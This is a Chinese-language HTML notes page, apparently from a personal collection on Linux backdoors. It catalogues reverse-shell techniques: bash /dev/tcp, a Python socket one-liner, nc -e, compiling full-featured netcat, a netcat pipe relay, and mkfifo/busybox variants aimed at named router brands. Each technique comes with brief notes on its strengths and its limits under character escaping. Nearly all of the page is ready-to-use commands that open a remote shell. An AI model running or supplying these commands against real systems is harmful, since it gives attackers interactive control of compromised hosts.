<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="linux反弹shell"><span class="csDE05BCC">LINUX</span><span class="csECDA2D3">反弹</span><span class="csDE05BCC">shell</span></a></h1>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">关于反弹原理，和每一步的数据流向在网上都有文章，就不复制了。这里只是用来总结下常规反弹</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">的用法，顺便说下优点缺点。</span></p><h3 class="cs868C439D">
			<a name="姿势一"><span class="csD6CA00D2">姿势一</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">bash -i &gt;&amp; /dev/tcp/127.0.0.1/6666 0&gt;&amp;1</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/Linux_Unix_隐藏文件和文件夹/linux%e5%8f%8d%e5%bc%b9shell_files/image0.png" width="560" height="52" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">优点：在大多数</span><span class="cs8926E06">Liunx</span><span class="cs9C1B1871">系统上都可以使用，缺点：在路由器系统中不存在</span><span class="cs8926E06">bash</span><span class="cs9C1B1871">，存在符号</span><span class="cs8926E06">&gt;</span><span class="cs9C1B1871">、</span><span class="cs8926E06">&amp; </span><span class="cs9C1B1871">在反序列化中或者对符号转义的情况下就没有办法反弹了。</span></p><h3 class="cs868C439D">
			<a name="姿势二"><span class="csD6CA00D2">姿势二</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;127.0.0.1&#39;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/Linux_Unix_隐藏文件和文件夹/linux%e5%8f%8d%e5%bc%b9shell_files/image1.png" width="560" height="58" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">优点：在安装了</span><span class="cs8926E06">python</span><span class="cs9C1B1871">上的</span><span class="cs8926E06">linux</span><span class="cs9C1B1871">都可以使用，原理还是将标准输入、标准输出、标准错误输出重定向到远程。使用</span><span class="cs8926E06">bash</span><span class="cs9C1B1871">交互模式启动。缺点：在路由器系统中不存在</span><span class="cs8926E06">bash</span><span class="cs9C1B1871">或者阉割了</span><span class="cs8926E06">python</span><span class="cs9C1B1871">库，存在符号</span><span class="cs8926E06">&gt;</span><span class="cs9C1B1871">、</span><span class="cs8926E06">&amp; </span><span class="cs9C1B1871">、</span><span class="cs8926E06">&#39;</span><span class="cs9C1B1871">、</span><span class="cs8926E06">&quot;</span><span class="cs9C1B1871">在反序列化中或者对符号转义的情况下就没有办法反弹了。单双引号也会导致闭合问题。</span></p><h3 class="cs868C439D">
			<a name="姿势三"><span class="csD6CA00D2">姿势三</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">nc -e /bin/bash 127.0.0.1 6666</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/Linux_Unix_隐藏文件和文件夹/linux%e5%8f%8d%e5%bc%b9shell_files/image2.png" width="560" height="93" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="姿势四"><span class="csD6CA00D2">姿势四</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">一般</span><span class="cs8926E06">Netcat</span><span class="cs9C1B1871">有两个版本，一个版本是不提供反向连接的版本，一个是全功能版本。这两者的区别就是是否带</span><span class="cs8926E06">-e</span><span class="cs9C1B1871">参数，只有带</span><span class="cs8926E06">-e</span><span class="cs9C1B1871">参数的版本才支持反向连接。</span><span class="cs8926E06">ubuntu 18.04</span><span class="cs9C1B1871">安装的是不提供反向链接的版本。</span></p><p class="cs3A447A38"><span class="cs9FB05234">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gztar -zxvf netcat-0.7.1.tar.gz -C /usr/localcd /usr/localmv netcat-0.7.1 netcatcd /usr/local/netcat./configuremake &amp;&amp; make install</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/Linux_Unix_隐藏文件和文件夹/linux%e5%8f%8d%e5%bc%b9shell_files/image3.png" width="560" height="53" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">优点：直接反弹，没有多余的符号。缺点：系统</span><span class="cs8926E06">apt</span><span class="cs9C1B1871">默认安装的都是不提供反向链接的版本，需要自己上传编译后的二进制版本。</span></p><h4 class="cs868C439D">
			<a name="解决方法1"><span class="cs6EDCDAE2">解决方法</span><span class="csBF12A472">1:</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">nc 127.0.0.1 6666|/bin/bash|nc 127.0.0.1 7777</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/Linux_Unix_隐藏文件和文件夹/linux%e5%8f%8d%e5%bc%b9shell_files/image4.png" width="560" height="52" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">利用</span><span class="cs8926E06">6666</span><span class="cs9C1B1871">端口传入内容交给</span><span class="cs8926E06">bash</span><span class="cs9C1B1871">执行，再将内容从</span><span class="cs8926E06">7777</span><span class="cs9C1B1871">送出去，管道符的用法。可以在阉割功能的</span><span class="cs8926E06">nc</span><span class="cs9C1B1871">上使用。</span></p><h4 class="cs868C439D">
			<a name="解决方法2针对某些mips架构的路由器busybox终端的系统："><span class="cs6EDCDAE2">解决方法</span><span class="csBF12A472">2(</span><span class="cs6EDCDAE2">针对某些</span><span class="csBF12A472">mips</span><span class="cs6EDCDAE2">架构的路由器</span><span class="csBF12A472">&amp;busybox</span><span class="cs6EDCDAE2">终端的系统</span><span class="csBF12A472">)</span><span class="cs6EDCDAE2">：</span></a></h4>
		<p class="cs3A447A38"><span class="cs9FB05234">//</span><span class="cs7FFD2630">锐捷</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mkfifo /tmp/backpipe1 | /bin/sh 0&lt;/tmp/backpipe1 | nc 127.0.0.1 6666 1&gt;/tmp/backpipe1</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//</span><span class="cs7FFD2630">飞鱼星反弹</span><span class="cs9FB05234">shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">mkfifo /tmp/backpipe1 | /bin/sh 0&lt;/tmp/backpipe1 | /bin/busybox nc 127.0.0.1 6666 1&gt;/tmp/backpipe1</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p></body>
</html>
